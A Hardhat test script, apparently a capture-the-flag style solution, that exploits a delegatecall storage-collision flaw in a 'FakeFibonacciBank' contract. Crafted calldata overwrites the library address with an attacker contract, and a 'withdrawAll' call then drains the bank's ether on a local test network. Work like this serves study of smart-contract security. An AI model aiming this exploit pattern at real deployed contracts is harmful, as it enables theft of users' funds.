const { expect } = require("chai");
const { ethers } = require("hardhat");
const hre = require('hardhat');

describe.only("Fake Fibonacci", function () {
  it("test", async function () {
    // init
    const provider = hre.network.provider;
    const [signer] = await hre.ethers.getSigners();

    const ffLibFactory = await ethers.getContractFactory("FakeFibonacciLib");
    const ffLib = await ffLibFactory.deploy();
    await ffLib.deployed();

    console.log('ffLib address:', ffLib.address);

    const ffFactory = await ethers.getContractFactory("FakeFibonacciBank");
    const ff = await ffFactory.deploy(ffLib.address, { value: ethers.utils.parseEther('1')});
    await ff.deployed();

    console.log('ff address:', ff.address);
    console.log('ff balance:', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());

    // attack
    console.log('fakeFibonacciLibrary:', await ff.fakeFibonacciLibrary());
    console.log('calculatedFibNumber:', await ff.calculatedFibNumber());
    console.log('start:', await ff.start());
    console.log('withdrawalCounter:', await ff.withdrawalCounter());

    const ffLibAttackFactory = await ethers.getContractFactory("FakeFibonacciLibAttack");
    const ffLibAttack = await ffLibAttackFactory.deploy();
    await ffLibAttack.deployed();

    // change ffLib address
    console.log('ffLibAttack.address:', ffLibAttack.address);
    const attackDelegateCallData = ffLib.interface.encodeFunctionData('setStart', [ffLibAttack.address]);
    console.log('attackDelegateCallData:', attackDelegateCallData);

    await signer.sendTransaction({
      to: ff.address,
      from: signer.address,
      data: attackDelegateCallData,
    });

    console.log('start:', await ff.start());
    console.log('fakeFibonacciLibrary:', await ff.fakeFibonacciLibrary());

    const withdrawAllData = ffLibAttack.interface.encodeFunctionData('withdrawAll', []);
    console.log('withdrawAllData:', withdrawAllData);

    await signer.sendTransaction({
      to: ff.address,
      from: signer.address,
      data: withdrawAllData,
    });

    console.log('ff balance:', ethers.BigNumber.from(await provider.send('eth_getBalance', [ff.address])).toString());
  });
});
